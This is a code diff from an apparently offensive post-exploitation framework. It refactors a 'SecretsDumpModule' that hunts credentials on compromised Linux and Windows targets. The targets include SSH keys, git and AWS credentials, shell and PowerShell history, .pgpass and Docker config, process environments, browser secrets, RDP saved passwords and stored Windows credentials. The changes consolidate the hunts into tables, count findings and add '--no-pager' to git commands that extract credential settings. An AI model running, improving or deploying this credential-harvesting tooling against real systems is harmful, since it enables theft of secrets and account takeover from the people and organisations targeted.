@@ -108,6 +108,21 @@ def filter_env_vars(content: str) -> Dict[str, str]:
     return result
 
 
+def _count_findings(value) -> int:
+    """Count leaf data points in a nested hunt result (dict / list / scalar).
+
+    Each hunt returns a dict of category -> data, where data may itself be a
+    dict (e.g. 34 git remotes) or a list (e.g. history lines). Counting the
+    top-level keys would report one finding per category; this walks into the
+    nested collections so the total reflects the actual number of items found.
+    """
+    if isinstance(value, dict):
+        return sum(_count_findings(v) for v in value.values())
+    if isinstance(value, list):
+        return len(value)
+    return 1
+
+
 class SecretsDumpModule(KoiModule):
     name        = "secrets"
     description = "Hunt for secrets, credentials, API keys, and sensitive data on the target."
@@ -124,87 +139,32 @@ class SecretsDumpModule(KoiModule):
     def _run_linux(self) -> None:
         """Hunt for credentials on Linux targets."""
         self.status("Hunting for secrets on Linux...")
+
+        # (display label, hunt method). Add a source by adding one row.
+        hunts = [
+            ("SSH Keys",              self._hunt_ssh_keys),
+            ("Git Credentials",       self._hunt_git_creds),
+            ("Shell History",         self._hunt_bash_history),
+            ("Environment Variables", self._hunt_env_vars),
+            ("PostgreSQL (.pgpass)",  self._hunt_pgpass),
+            ("Docker Credentials",    self._hunt_docker),
+            (".env Files",            self._hunt_env_files),
+            ("API Keys",              self._hunt_api_keys),
+            ("AWS Credentials",       self._hunt_aws),
+            ("Process Environment",   self._hunt_process_env),
+            ("Git Diffs",             self._hunt_git_diffs),
+            ("Browser Secrets",       self._hunt_browser_secrets),
+        ]
+
         total_found = 0
+        for label, hunt in hunts:
+            self.status(f"Hunting {label.lower()}...")
+            result = hunt()
+            if result:
+                self._display_results(label, result)
+                total_found += _count_findings(result)
 
-        # Phase 1: SSH keys
-        self.status("Hunting SSH keys & config...")
-        ssh_keys = self._hunt_ssh_keys()
-        if ssh_keys:
-            self._display_results("SSH Keys", ssh_keys)
-            total_found += len(ssh_keys)
-
-        # Phase 2: Git credentials
-        self.status("Hunting Git credentials...")
-        git_creds = self._hunt_git_creds()
-        if git_creds:
-            self._display_results("Git Credentials", git_creds)
-            total_found += 1
-
-        # Phase 3: Shell history
-        self.status("Hunting shell history...")
-        bash_hist = self._hunt_bash_history()
-        if bash_hist:
-            self._display_results("Shell History", bash_hist)
-            total_found += len(bash_hist)
-
-        # Phase 4: Environment variables
-        self.status("Hunting environment variables...")
-        env_vars = self._hunt_env_vars()
-        if env_vars:
-            self._display_results("Environment Variables", env_vars)
-            total_found += 1
-
-        # Phase 5: Config file secrets (.env, .pgpass, etc)
-        self.status("Hunting config files...")
-        pgpass = self._hunt_pgpass()
-        if pgpass:
-            self._display_results("PostgreSQL (.pgpass)", pgpass)
-            total_found += 1
-
-        docker_creds = self._hunt_docker()
-        if docker_creds:
-            self._display_results("Docker Credentials", docker_creds)
-            total_found += 1
-
-        env_files = self._hunt_env_files()
-        if env_files:
-            self._display_results(".env Files", env_files)
-            total_found += len(env_files)
-
-        # Phase 6: API keys
-        self.status("Hunting API keys...")
-        api_keys = self._hunt_api_keys()
-        if api_keys:
-            self._display_results("API Keys", api_keys)
-            total_found += 1
-
-        aws_creds = self._hunt_aws()
-        if aws_creds:
-            self._display_results("AWS Credentials", aws_creds)
-            total_found += 1
-
-        # Phase 7: Process environment
-        self.status("Hunting process environment...")
-        proc_env = self._hunt_process_env()
-        if proc_env:
-            self._display_results("Process Environment", proc_env)
-            total_found += 1
-
-        # Phase 8: Git diffs
-        self.status("Hunting git diffs...")
-        git_diffs = self._hunt_git_diffs()
-        if git_diffs:
-            self._display_results("Git Diffs", git_diffs)
-            total_found += 1
-
-        # Phase 9: Browser secrets
-        self.status("Hunting browser secrets...")
-        browser_secrets = self._hunt_browser_secrets()
-        if browser_secrets:
-            self._display_results("Browser Secrets", browser_secrets)
-            total_found += 1
-
-        if total_found > 0:
+        if total_found:
             self.success(f"Found {total_found} secret(s)")
         else:
             self.warn("No obvious secrets found")
@@ -435,7 +395,7 @@ class SecretsDumpModule(KoiModule):
 
             # Get git log with format for better parsing
             git_log = self._try_exec(
-                f"cd '{repo}' && git log --oneline -n 20 2>/dev/null"
+                f"cd '{repo}' && git --no-pager log --oneline -n 20 2>/dev/null"
             )
 
             if git_log:
@@ -501,42 +461,26 @@ class SecretsDumpModule(KoiModule):
     def _run_windows(self) -> None:
         """Hunt for credentials on Windows targets."""
         self.status("Hunting for credentials on Windows...")
-        creds_found = {}
 
-        # PowerShell history
-        ps_hist = self._hunt_ps_history()
-        if ps_hist:
-            creds_found["PowerShell History"] = ps_hist
+        # (display label, hunt method). Add a source by adding one row.
+        hunts = [
+            ("PowerShell History",    self._hunt_ps_history),
+            ("Stored Credentials",    self._hunt_stored_creds),
+            ("Git Credentials",       self._hunt_win_git),
+            ("Environment Variables", self._hunt_win_env),
+            ("RDP Connections",       self._hunt_rdp),
+            ("Browser Data",          self._hunt_browser),
+        ]
 
-        # Stored credentials
-        creds = self._hunt_stored_creds()
-        if creds:
-            creds_found["Stored Credentials"] = creds
+        found = 0
+        for label, hunt in hunts:
+            result = hunt()
+            if result:
+                self._display_results(label, result)
+                found += 1
 
-        # Git credentials
-        git_creds = self._hunt_win_git()
-        if git_creds:
-            creds_found["Git Credentials"] = git_creds
-
-        # Environment variables
-        env_vars = self._hunt_win_env()
-        if env_vars:
-            creds_found["Environment Variables"] = env_vars
-
-        # RDP saved passwords
-        rdp = self._hunt_rdp()
-        if rdp:
-            creds_found["RDP Connections"] = rdp
-
-        # Browser history (basic)
-        browser = self._hunt_browser()
-        if browser:
-            creds_found["Browser Data"] = browser
-
-        if creds_found:
-            for category, entries in creds_found.items():
-                self._display_results(category, entries)
-            self.success(f"Found credentials in {len(creds_found)} categories")
+        if found:
+            self.success(f"Found credentials in {found} categories")
         else:
             self.warn("No obvious credentials found")
 
@@ -573,7 +517,7 @@ class SecretsDumpModule(KoiModule):
         result = {}
 
         git_cfg = self._win_query(
-            "&{git config --global -l 2>$null | Select-String -Pattern '(user|credential|password)' | Out-String}"
+            "&{git --no-pager config --global -l 2>$null | Select-String -Pattern '(user|credential|password)' | Out-String}"
         )
 
         if git_cfg.strip():
